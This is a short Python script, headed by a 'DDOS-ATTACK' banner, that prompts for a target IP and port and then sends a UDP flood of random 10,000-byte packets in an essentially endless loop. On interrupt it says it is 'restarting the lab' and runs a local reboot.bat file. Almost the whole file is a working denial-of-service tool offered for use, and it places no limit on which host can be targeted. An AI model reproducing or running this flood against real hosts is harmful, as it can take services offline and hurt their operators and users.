import os
import socket
from colorama import *
import time
os.system("cls||clear")
print(f"""
{Fore.GREEN}
██████╗░██████╗░░█████╗░░██████╗░░░░░░░█████╗░████████╗████████╗░█████╗░░█████╗░██╗░░██╗
██╔══██╗██╔══██╗██╔══██╗██╔════╝░░░░░░██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔══██╗██║░██╔╝
██║░░██║██║░░██║██║░░██║╚█████╗░█████╗███████║░░░██║░░░░░░██║░░░███████║██║░░╚═╝█████═╝░
██║░░██║██║░░██║██║░░██║░╚═══██╗╚════╝██╔══██║░░░██║░░░░░░██║░░░██╔══██║██║░░██╗██╔═██╗░
██████╔╝██████╔╝╚█████╔╝██████╔╝░░░░░░██║░░██║░░░██║░░░░░░██║░░░██║░░██║╚█████╔╝██║░╚██╗
╚═════╝░╚═════╝░░╚════╝░╚═════╝░░░░░░░╚═╝░░╚═╝░░░╚═╝░░░░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝
{Fore.WHITE}
""")
import socket, random, time
try:
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	 
	ip = input("[-] Enter Target IP: ")
	port = int(input("[-] Enter Target Port: "))
	sleep = float(input("Sleep: "))
	 
	s.connect((ip, port))
	 
	for i in range(1, 100**1000):
	    s.send(random._urandom(10)*1000)
	    print(f"Send: {i}", end='\r')
	    time.sleep(sleep)
except KeyboardInterrupt:
	print("\n"+"[!] Aborted process! restarting the lab.")
	time.sleep(2)
	os.system("reboot.bat")